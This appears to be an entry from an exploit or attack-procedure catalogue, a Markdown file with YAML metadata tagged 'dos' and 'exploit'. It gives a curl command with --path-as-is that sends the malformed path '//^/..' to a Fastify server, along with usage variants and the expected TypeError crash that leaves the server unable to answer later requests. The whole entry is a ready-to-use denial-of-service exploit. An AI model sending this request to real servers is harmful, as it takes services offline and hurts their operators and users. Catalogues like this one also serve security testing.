---
id: uuid-curl-dos
data: 'curl --path-as-is "http://localhost:3000//^/.."'
tags:
  - dos
  - exploit
type: command
output: 'TypeError [ERR_INVALID_URL]: Invalid URL: //^/.. and server crash'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.773Z'
verified: false
validated: true
submitted: true
---
# curl-path-as-is-dos

## Command

```bash
curl --path-as-is "http://localhost:3000//^/.."
```

## Description

Sends a GET request to the vulnerable Fastify server with an invalid path '//^/..' to trigger a DoS crash via unhandled URL parsing error.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --path-as-is | Preserves the exact path without normalization | Yes |
| URL | Target endpoint with malformed path | Yes |

## Examples

### Basic Usage

```bash
curl --path-as-is "http://localhost:3000//^/.."
```

### Advanced Usage

```bash
curl --path-as-is -v "http://localhost:3000//^/.."  # Verbose for debugging
```

## Expected Output

No HTTP response; instead, server-side crash logged as "TypeError [ERR_INVALID_URL]: Invalid URL: //^/..". Subsequent requests fail.

## Related

- [[Related Procedure: Exploit-DoS-with-Invalid-URL-Path]]
